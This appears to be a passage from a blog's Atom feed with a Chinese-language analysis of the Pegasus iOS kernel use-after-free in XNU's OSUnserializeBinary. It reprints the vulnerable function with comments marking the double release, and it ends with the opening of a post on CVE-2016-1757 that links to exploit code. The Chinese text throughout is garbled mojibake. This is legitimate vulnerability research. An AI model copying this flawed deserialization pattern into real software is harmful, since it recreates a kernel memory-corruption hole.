<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å¦‚æœå­˜åœ¨ä¸€ä¸ªè§£æå‡ºæ¥çš„dict</span></span><br><span class="line"><span class="keyword">if</span> (dict)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (sym)</span><br><span class="line">	&#123;</span><br><span class="line">		DEBG(<span class="string">"%s = %s\n"</span>, sym-&gt;getCStringNoCopy(), o-&gt;getMetaClass()-&gt;getClassName());</span><br><span class="line">		<span class="keyword">if</span> (o != dict) </span><br><span class="line">		&#123;</span><br><span class="line">			ok = dict-&gt;setObject(sym, o);</span><br><span class="line">		&#125;</span><br><span class="line">		o-&gt;release();</span><br><span class="line">		sym-&gt;release();</span><br><span class="line">		sym = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">		sym = OSDynamicCast(OSSymbol, o);</span><br><span class="line">		<span class="keyword">if</span> (!sym &amp;&amp; (str = OSDynamicCast(OSString, o)))</span><br><span class="line">		&#123;</span><br><span class="line">		    sym = (OSSymbol *) OSSymbol::withString(str);</span><br><span class="line">		    o-&gt;release();		<span class="comment">//å†æ¬¡è°ƒç”¨oçš„releaseå‡½æ•°ï¼Œå‡ºå‘UAFã€‚</span></span><br><span class="line">		    o = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		ok = (sym != <span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x03_å°ç»“">0x03 å°ç»“</h1><p>â€‹    è¿™æ˜¯ä»Šå¹´åœ¨è¿™ä¸ªæ¨¡å—ç¬¬äºŒæ¬¡å‡ºç°<code>UAF</code>çš„æ¼æ´äº†ï¼Œåœ¨ååºåˆ—åŒ–çš„æµç¨‹ä¸­ï¼Œå°†ä¸­é—´äº§ç”Ÿçš„å…ƒç´ å­˜æ”¾åœ¨<code>objArrays</code>å½“ä¸­ï¼Œåœ¨å¤„ç†<code>reference</code>çš„æ—¶å€™è¿›è¡Œä½¿ç”¨ï¼Œä½†æ˜¯æ²¡æœ‰è€ƒè™‘åˆ°<code>reference</code>çš„æµç¨‹ä¸­ï¼Œä¼šä½¿ç”¨åˆ°å·²ç»è¢«<code>free</code>çš„å…ƒç´ ã€‚</p>
<p>åœ¨è¿‡å»çš„æ—¥å¸¸å¼€å‘ä¸­ï¼Œåæ€å­—èŠ‚å¼€å‘çš„åºåˆ—åŒ–åº“ï¼Œä¹Ÿç¡®å®ç»å¸¸ä¼šåšç±»ä¼¼çš„å¤„ç†ï¼Œé»˜è®¤äº†å‡½æ•°çš„è¾“å…¥éƒ½æ˜¯åˆç†çš„æ•°æ®ï¼Œå¹¶å¯¹åºåˆ—åŒ–äº§ç”Ÿçš„æ•°æ®è¿›è¡Œäº†è¯¦ç»†çš„æµ‹è¯•ï¼Œç¡®ä¿ååºåˆ—åŒ–ä¸ä¼šå‡ºé—®é¢˜ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰è€ƒè™‘åˆ°æ¶æ„æ„é€ çš„äºŒè¿›åˆ¶æ•°æ®å’Œåºåˆ—åŒ–å‡½æ•°äº§ç”Ÿçš„äºŒè¿›åˆ¶æ•°æ®ï¼Œåœ¨æ‰§è¡Œæ—¶å¯èƒ½ä¼šé€ æˆä¸åŒçš„æµç¨‹ã€‚</p>
<h1 id="reference">reference</h1><p>1.PEGASUS iOS Kernel Vulnerability Explaine</p>
<p> <a href="https://sektioneins.de/en/blog/16-09-02-pegasus-ios-kernel-vulnerability-explained.html" target="_blank" rel="external">https://sektioneins.de/en/blog/16-09-02-pegasus-ios-kernel-vulnerability-explained.html</a></p>
<p>2.PEGASUS iOS Kernel Vulnerability Explained - Part 2</p>
<p><a href="https://sektioneins.de/en/blog/16-09-05-pegasus-ios-kernel-vulnerability-explained-part-2.html" target="_blank" rel="external">https://sektioneins.de/en/blog/16-09-05-pegasus-ios-kernel-vulnerability-explained-part-2.html</a></p>
<h1 id="é™„">é™„</h1><p>æºç </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */</span><br><span class="line"></span><br><span class="line">#define setAtIndex(v, idx, o)													\</span><br><span class="line">	if (idx &gt;= v##Capacity)														\</span><br><span class="line">	&#123;																			\</span><br><span class="line">		uint32_t ncap = v##Capacity + 64;										\</span><br><span class="line">		typeof(v##Array) nbuf = (typeof(v##Array)) kalloc_container(ncap * sizeof(o));	\</span><br><span class="line">		if (!nbuf) ok = false;													\</span><br><span class="line">		if (v##Array)															\</span><br><span class="line">		&#123;																		\</span><br><span class="line">			bcopy(v##Array, nbuf, v##Capacity * sizeof(o));						\</span><br><span class="line">			kfree(v##Array, v##Capacity * sizeof(o));							\</span><br><span class="line">		&#125;																		\</span><br><span class="line">		v##Array    = nbuf;														\</span><br><span class="line">		v##Capacity = ncap;														\</span><br><span class="line">	&#125;																			\</span><br><span class="line">	if (ok) v##Array[idx] = o;</span><br><span class="line"></span><br><span class="line">/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */</span><br><span class="line"></span><br><span class="line">OSObject *</span><br><span class="line">OSUnserializeBinary(const char *buffer, size_t bufferSize, OSString **errorString)</span><br><span class="line">&#123;</span><br><span class="line">	OSObject ** objsArray;</span><br><span class="line">	uint32_t    objsCapacity;</span><br><span class="line">	uint32_t    objsIdx;</span><br><span class="line"></span><br><span class="line">	OSObject ** stackArray;</span><br><span class="line">	uint32_t    stackCapacity;</span><br><span class="line">	uint32_t    stackIdx;</span><br><span class="line"></span><br><span class="line">    OSObject     * result;</span><br><span class="line">    OSObject     * parent;</span><br><span class="line">    OSDictionary * dict;</span><br><span class="line">    OSArray      * array;</span><br><span class="line">    OSSet        * set;</span><br><span class="line">    OSDictionary * newDict;</span><br><span class="line">    OSArray      * newArray;</span><br><span class="line">    OSSet        * newSet;</span><br><span class="line">    OSObject     * o;</span><br><span class="line">    OSSymbol     * sym;</span><br><span class="line">    OSString     * str;</span><br><span class="line"></span><br><span class="line">    size_t           bufferPos;</span><br><span class="line">    const uint32_t * next;</span><br><span class="line">    uint32_t         key, len, wordLen;</span><br><span class="line">    bool             end, newCollect, isRef;</span><br><span class="line">    unsigned long long value;</span><br><span class="line">    bool ok;</span><br><span class="line"></span><br><span class="line">	if (errorString) *errorString = 0;</span><br><span class="line">	</span><br><span class="line">	/*</span><br><span class="line">	#define kOSSerializeBinarySignature "\323\0\0"</span><br><span class="line">	*/</span><br><span class="line">	// æ£€æµ‹æ˜¯å¦æ˜¯æ˜¯å…·æœ‰ç­¾åçš„å†…å­˜æ•°æ®</span><br><span class="line">	if (0 != strcmp(kOSSerializeBinarySignature, buffer)) return (NULL);</span><br><span class="line">	// 0000 0011 &amp;&amp; bufferæŒ‡é’ˆ ==ã€‹bufferçš„åœ°å€æœ«å°¾ä¸èƒ½æ˜¯11</span><br><span class="line">	if (3 &amp; ((uintptr_t) buffer)) return (NULL);</span><br><span class="line">	// æ£€æµ‹buffersizeçš„å¤§å°è¦å°äºkOSSerializeBinarySignatureçš„å¤§å°</span><br><span class="line">	if (bufferSize &lt; sizeof(kOSSerializeBinarySignature)) return (NULL);</span><br><span class="line">	// è·³è¿‡å†…å­˜å¼€å§‹çš„ç­¾åéƒ¨åˆ†ï¼Œè·å–ç¬¬ä¸€ä¸ªéœ€è¦è§£æçš„å†…å­˜</span><br><span class="line">	bufferPos = sizeof(kOSSerializeBinarySignature);</span><br><span class="line">	next = (typeof(next)) (((uintptr_t) buffer) + bufferPos);</span><br><span class="line"></span><br><span class="line">	DEBG("---------OSUnserializeBinary(%p)\n", buffer);</span><br><span class="line"></span><br><span class="line">	objsArray = stackArray    = NULL;</span><br><span class="line">	objsIdx   = objsCapacity  = 0;</span><br><span class="line">	stackIdx  = stackCapacity = 0;</span><br><span class="line"></span><br><span class="line">    result   = 0;</span><br><span class="line">    parent   = 0;</span><br><span class="line">	dict     = 0;</span><br><span class="line">	array    = 0;</span><br><span class="line">	set      = 0;</span><br><span class="line">	sym      = 0;</span><br><span class="line"></span><br><span class="line">	ok = true;</span><br><span class="line">	while (ok)</span><br><span class="line">	&#123;</span><br><span class="line">		// é€šè¿‡nextæŒ‡å‘çš„å†…å®¹è·å–å½“å‰çš„keyçš„pos</span><br><span class="line">		bufferPos += sizeof(*next);</span><br><span class="line">		// æ£€æµ‹æ˜¯å¦åˆ†æå®Œæˆ</span><br><span class="line">		if (!(ok = (bufferPos &lt;= bufferSize))) break;</span><br><span class="line">		// è·å–å½“å‰çš„key</span><br><span class="line">		key = *next++;</span><br><span class="line"></span><br><span class="line">        len = (key &amp; kOSSerializeDataMask);</span><br><span class="line">        wordLen = (len + 3) &gt;&gt; 2; //è®¡ç®—è¦ç”¨å‡ ä¸ªword</span><br><span class="line">		end = (0 != (kOSSerializeEndCollecton &amp; key));</span><br><span class="line">        DEBG("key 0x%08x: 0x%04x, %d\n", key, len, end);</span><br><span class="line"></span><br><span class="line">        newCollect = isRef = false;</span><br><span class="line">		o = 0; newDict = 0; newArray = 0; newSet = 0;</span><br><span class="line">		</span><br><span class="line">		//æ ¹æ®keyçš„ä¸åŒå¯¹ä¸åŒçš„æ•°æ®ç»“æ„åšæ“ä½œ</span><br><span class="line">		switch (kOSSerializeTypeMask &amp; key)</span><br><span class="line">		&#123;</span><br><span class="line">		    case kOSSerializeDictionary:</span><br><span class="line">				o = newDict = OSDictionary::withCapacity(len);</span><br><span class="line">				newCollect = (len != 0);</span><br><span class="line">		        break;</span><br><span class="line">		    case kOSSerializeArray:</span><br><span class="line">				o = newArray = OSArray::withCapacity(len);</span><br><span class="line">				newCollect = (len != 0);</span><br><span class="line">		        break;</span><br><span class="line">		    case kOSSerializeSet:</span><br><span class="line">				o = newSet = OSSet::withCapacity(len);</span><br><span class="line">				newCollect = (len != 0);</span><br><span class="line">		        break;</span><br><span class="line"></span><br><span class="line">		    case kOSSerializeObject:</span><br><span class="line">				if (len &gt;= objsIdx) break;</span><br><span class="line">				o = objsArray[len];</span><br><span class="line">				o-&gt;retain();</span><br><span class="line">				isRef = true;</span><br><span class="line">				break;</span><br><span class="line"></span><br><span class="line">		    case kOSSerializeNumber:</span><br><span class="line">				bufferPos += sizeof(long long);</span><br><span class="line">				if (bufferPos &gt; bufferSize) break;</span><br><span class="line">		    	value = next[1];</span><br><span class="line">		    	value &lt;&lt;= 32;</span><br><span class="line">		    	value |= next[0];</span><br><span class="line">		    	o = OSNumber::withNumber(value, len);</span><br><span class="line">		    	next += 2;</span><br><span class="line">		        break;</span><br><span class="line"></span><br><span class="line">		    case kOSSerializeSymbol:</span><br><span class="line">				bufferPos += (wordLen * sizeof(uint32_t));</span><br><span class="line">				if (bufferPos &gt; bufferSize)           break;</span><br><span class="line">				if (0 != ((const char *)next)[len-1]) break;</span><br><span class="line">		        o = (OSObject *) OSSymbol::withCString((const char *) next);</span><br><span class="line">		        next += wordLen;</span><br><span class="line">		        break;</span><br><span class="line"></span><br><span class="line">		    case kOSSerializeString:</span><br><span class="line">				bufferPos += (wordLen * sizeof(uint32_t));</span><br><span class="line">				if (bufferPos &gt; bufferSize) break;</span><br><span class="line">		        o = OSString::withStringOfLength((const char *) next, len);</span><br><span class="line">		        next += wordLen;</span><br><span class="line">		        break;</span><br><span class="line"></span><br><span class="line">    	    case kOSSerializeData:</span><br><span class="line">				bufferPos += (wordLen * sizeof(uint32_t));</span><br><span class="line">				if (bufferPos &gt; bufferSize) break;</span><br><span class="line">		        o = OSData::withBytes(next, len);</span><br><span class="line">		        next += wordLen;</span><br><span class="line">		        break;</span><br><span class="line"></span><br><span class="line">    	    case kOSSerializeBoolean:</span><br><span class="line">				o = (len ? kOSBooleanTrue : kOSBooleanFalse);</span><br><span class="line">		        break;</span><br><span class="line"></span><br><span class="line">		    default:</span><br><span class="line">		        break;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		//é€€å‡ºå¾ªç¯</span><br><span class="line">		if (!(ok = (o != 0))) break;</span><br><span class="line"></span><br><span class="line">		</span><br><span class="line">		//å¦‚æœååºåˆ—åŒ–çš„ç»“æœä¸æ˜¯ä¸€ä¸ªreference</span><br><span class="line">		//å°±å°†ç»“æœå­˜æ”¾åˆ°objsCapacityä¹‹ä¸­</span><br><span class="line">		//å¦‚æœååºåˆ—åŒ–è‡ªåå†…å­˜ç”³è¯·å¤±è´¥,åˆ™é€€å‡ºååºåˆ—åŒ–</span><br><span class="line">		if (!isRef)</span><br><span class="line">		&#123;</span><br><span class="line">			setAtIndex(objs, objsIdx, o);</span><br><span class="line">			//å¦‚æœokçš„å€¼ä¸ºfalseï¼Œåˆ™é€€å‡ºååºåˆ—åŒ–å¾ªç¯</span><br><span class="line">			</span><br><span class="line">			//	#define kalloc_container(size)	\</span><br><span class="line">					kalloc_tag_bt(size, VM_KERN_MEMORY_LIBKERN)</span><br><span class="line">			/*</span><br><span class="line">				typeof(objsArray) nbuf = (typeof(objsArray)) kalloc_container(ncap * sizeof(o));	</span><br><span class="line">				if (!nbuf) ok = false;</span><br><span class="line">			*/</span><br><span class="line">			</span><br><span class="line">			//åœ¨å†…æ ¸ä¸­ç”³è¯·ncap*sizeofï¼ˆoï¼‰å¤§å°çš„å†…å­˜ï¼Œå¦‚æœç”³è¯·å¤±è´¥çš„äº†åˆ™okè®¾ä¸ºfalse</span><br><span class="line">			if (!ok) &#123;</span><br><span class="line">				break;</span><br><span class="line">			&#125;</span><br><span class="line">			objsIdx++;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		//å¦‚æœå­˜åœ¨ä¸€ä¸ªè§£æå‡ºæ¥çš„dict</span><br><span class="line">		if (dict)</span><br><span class="line">		&#123;</span><br><span class="line">			if (sym)</span><br><span class="line">			&#123;</span><br><span class="line">				DEBG("%s = %s\n", sym-&gt;getCStringNoCopy(), o-&gt;getMetaClass()-&gt;getClassName());</span><br><span class="line">				if (o != dict) </span><br><span class="line">				&#123;</span><br><span class="line">					ok = dict-&gt;setObject(sym, o);</span><br><span class="line">				&#125;</span><br><span class="line">				o-&gt;release();</span><br><span class="line">				sym-&gt;release();</span><br><span class="line">				sym = 0;</span><br><span class="line">			&#125;</span><br><span class="line">			else </span><br><span class="line">			&#123;</span><br><span class="line">				sym = OSDynamicCast(OSSymbol, o);</span><br><span class="line">				if (!sym &amp;&amp; (str = OSDynamicCast(OSString, o)))</span><br><span class="line">				&#123;</span><br><span class="line">				    sym = (OSSymbol *) OSSymbol::withString(str);</span><br><span class="line">				    o-&gt;release();</span><br><span class="line">				    o = 0;</span><br><span class="line">				&#125;</span><br><span class="line">				ok = (sym != 0);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		else if (array) </span><br><span class="line">		&#123;</span><br><span class="line">			ok = array-&gt;setObject(o);</span><br><span class="line">		    o-&gt;release();</span><br><span class="line">		&#125;</span><br><span class="line">		else if (set)</span><br><span class="line">		&#123;</span><br><span class="line">		   ok = set-&gt;setObject(o);</span><br><span class="line">		   o-&gt;release();</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">		    assert(!parent);</span><br><span class="line">		    result = o;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		if (!ok) break;</span><br><span class="line"></span><br><span class="line">		if (newCollect)</span><br><span class="line">		&#123;</span><br><span class="line">			if (!end)</span><br><span class="line">			&#123;</span><br><span class="line">				stackIdx++;</span><br><span class="line">				setAtIndex(stack, stackIdx, parent);</span><br><span class="line">				if (!ok) break;</span><br><span class="line">			&#125;</span><br><span class="line">			DEBG("++stack[%d] %p\n", stackIdx, parent);</span><br><span class="line">			parent = o;</span><br><span class="line">			dict   = newDict;</span><br><span class="line">			array  = newArray;</span><br><span class="line">			set    = newSet;</span><br><span class="line">			end    = false;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		if (end)</span><br><span class="line">		&#123;</span><br><span class="line">			if (!stackIdx) break;</span><br><span class="line">			parent = stackArray[stackIdx];</span><br><span class="line">			DEBG("--stack[%d] %p\n", stackIdx, parent);</span><br><span class="line">			stackIdx--;</span><br><span class="line">			set   = 0; </span><br><span class="line">			dict  = 0; </span><br><span class="line">			array = 0;</span><br><span class="line">			if (!(dict = OSDynamicCast(OSDictionary, parent)))</span><br><span class="line">			&#123;</span><br><span class="line">				if (!(array = OSDynamicCast(OSArray, parent))) ok = (0 != (set = OSDynamicCast(OSSet, parent)));</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	DEBG("ret %p\n", result);</span><br><span class="line"></span><br><span class="line">	if (objsCapacity)  kfree(objsArray,  objsCapacity  * sizeof(*objsArray));</span><br><span class="line">	if (stackCapacity) kfree(stackArray, stackCapacity * sizeof(*stackArray));</span><br><span class="line"></span><br><span class="line">	if (!ok &amp;&amp; result)</span><br><span class="line">	&#123;</span><br><span class="line">		result-&gt;release();</span><br><span class="line">		result = 0;</span><br><span class="line">	&#125;</span><br><span class="line">	return (result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0x00_æ‘˜è¦">0x00 æ‘˜è¦</h1><p> <a href="http://blog.pangu.io/pegasus-apt/">Pegasus â€“ é’ˆå¯¹iOSè®¾å¤‡çš„APTæ”»å‡»åˆ†æ- PanguTeam</a></p>
<p> <a href="http://www.freebuf.com/articles/terminal/113128.html">iOSâ€œè¿œç¨‹è¶Šç‹±â€é—´è°è½¯ä»¶PegasusæŠ€æœ¯åˆ†æ</a></p>
<p>å…³å¿ƒ<code>IOS</code>å®‰å…¨çš„æŠ€æœ¯äººå‘˜æœ€è¿‘ä¸€å®šéƒ½å…³æ³¨äº†è¿™ä¸€æ¬¡çš„å®‰å…¨äº‹ä»¶ï¼Œä¸éœ€è¦å¤šåšæè¿°äº†ï¼Œæƒ³äº†è§£å…·ä½“ç»†èŠ‚çš„å¯ä»¥è‡ªè¡Œ<code>google</code>ã€‚</p>
<p>æœ¬æ–‡å†…å®¹</p>
<ul>
<li>äº†æ¼æ´æ‰€åœ¨çš„å‡½æ•°<code>OSUnserializeBinary</code>ï¼Œäº†è§£å…¶äºŒè¿›åˆ¶æ ¼å¼</li>
<li>ç†è§£<code>POC</code>ï¼Œåˆ†æ<code>POC</code>æ‰§è¡Œçš„æµç¨‹</li>
</ul>
<p>å…·ä½“çš„æŠ€æœ¯èƒŒæ™¯ï¼Œå¯ä»¥å‚è€ƒä¸‹é¢è¿™ç¯‡æ–‡ç« </p>
<p><a href="https://sektioneins.de/en/blog/16-09-02-pegasus-ios-kernel-vulnerability-explained.html">PEGASUS iOS Kernel Vulnerability Explained</a></p>
<p><a href="https://sektioneins.de/en/blog/16-09-05-pegasus-ios-kernel-vulnerability-explained-part-2.html">PEGASUS iOS Kernel Vulnerability Explained - Part 2</a></p>
<p><a href="http://bobao.360.cn/learning/detail/2996.html">iOSä¸‰å‰æˆŸæ¼æ´è¡¥ä¸åˆ†æã€åˆ©ç”¨ä»£ç  å…¬å¸ƒï¼ˆPOCï¼‰</a></p>]]>
    
    </summary>
    
      <category term="CVE" scheme="http://turingh.github.io/tags/CVE/"/>
    
      <category term="IOS" scheme="http://turingh.github.io/tags/IOS/"/>
    
      <category term="POC" scheme="http://turingh.github.io/tags/POC/"/>
    
      <category term="Pegasus" scheme="http://turingh.github.io/tags/Pegasus/"/>
    
      <category term="XNU" scheme="http://turingh.github.io/tags/XNU/"/>
    
      <category term="CVE" scheme="http://turingh.github.io/categories/CVE/"/>
    
      <category term="OS X" scheme="http://turingh.github.io/categories/CVE/OS-X/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[å†çœ‹CVE-2016-1757---æµ…æmach messageçš„ä½¿ç”¨]]></title>
    <link href="http://turingh.github.io/2016/07/05/%E5%86%8D%E7%9C%8BCVE-2016-1757%E6%B5%85%E6%9E%90mach%20message%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <id>http://turingh.github.io/2016/07/05/å†çœ‹CVE-2016-1757æµ…æmach messageçš„ä½¿ç”¨/</id>
    <published>2016-07-06T00:55:33.000Z</published>
    <updated>2016-07-06T06:16:13.000Z</updated>
    <content type="html"><![CDATA[<h1 id="0x00_æ‘˜è¦">0x00 æ‘˜è¦</h1><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-1757" target="_blank" rel="external">CVE-2016-1757</a>æ˜¯ä¸€ä¸ª<code>OS X</code>ç³»ç»Ÿä¸Šé€šè¿‡æ¡ä»¶ç«äº‰å®ç°ä»»æ„ä»£ç åœ¨<code>root</code>æƒé™æ‰§è¡Œçš„æ¼æ´ã€‚åœ¨è¿™ç¯‡æ–‡ç« ä¹‹å‰ï¼Œæˆ‘å·²ç»åˆ†æè¿‡äº†è¿™ä¸ªæ¼æ´çš„åŸç†ï¼Œä»¥åŠ<code>EXP</code>ä»£ç çš„å®ç°ã€‚</p>
<p><a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">CVE-2016-1757ç®€å•åˆ†æ</a></p>
<p><a href="http://turingh.github.io/2016/04/19/CVE-2016-1757%E5%88%A9%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/">CVE-2016-1757åˆ©ç”¨ç¨‹åºåˆ†æ</a></p>
<p><a href="http://turingh.github.io/2016/04/13/%E5%88%A9%E7%94%A8patch%E7%BB%95%E8%BF%87kextload%E5%AF%B9%E5%86%85%E6%A0%B8%E7%AD%BE%E5%90%8D%E7%9A%84%E6%A3%80%E6%B5%8B/">åˆ©ç”¨patchç»•è¿‡kextloadå¯¹å†…æ ¸ç­¾åçš„æ£€æµ‹</a></p>
<p>åœ¨<code>syscan2016</code>ä¸Šåˆæœ‰å›½å¤–çš„å®‰å…¨ç ”ç©¶äººå‘˜æ”¾å‡ºè‡ªå·±çš„<a href="https://github.com/gdbinit/mach_race" target="_blank" rel="external">åˆ©ç”¨ä»£ç </a>ã€‚å­¦ä¹ ä¹‹åï¼Œè¿™ä¸ªåˆ©ç”¨ä»£ç ç¡®å®æ¯”ä¹‹å‰çš„æ›´åŠ æ¸…æ™°ã€æ˜ç¡®ã€‚æ›´åŠ å®¹æ˜“ç†è§£ã€‚</p>
<p>è€Œä¸¤ä¸ªåˆ©ç”¨æœ¬è´¨ä¸Šé¢çš„ä¸åŒæ˜¯å¯¹<code>mach port</code>çš„ä¸åŒçš„åˆ©ç”¨æ–¹æ³•ã€‚ä¸‹é¢ä¸»è¦ç»“åˆä¸¤ä¸ªä¸åŒçš„POCï¼Œæ¥åˆ†æä¸€ä¸‹<code>mach message</code>çš„ä½¿ç”¨ï¼ŒåŒæ—¶ä¹Ÿæ˜¯ç ”ç©¶<code>xnu</code>çš„<code>IPC</code>çš„åŸºç¡€ã€‚</p>
<a id="more"></a>
